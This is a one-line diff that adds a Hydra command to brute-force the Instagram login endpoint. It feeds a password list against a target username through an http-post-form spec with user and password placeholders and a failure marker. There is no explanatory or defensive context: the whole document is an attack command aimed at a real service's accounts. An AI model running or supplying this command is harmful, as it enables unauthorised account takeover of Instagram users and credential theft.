@@ -1,0 +1,1 @@
+hydra -l username -P /path/to/password/list.txt instagram.com http-post-form "/accounts/login/ajax/:sobirsobir904=^USER^&password=^PASS^:F=json_error" -V
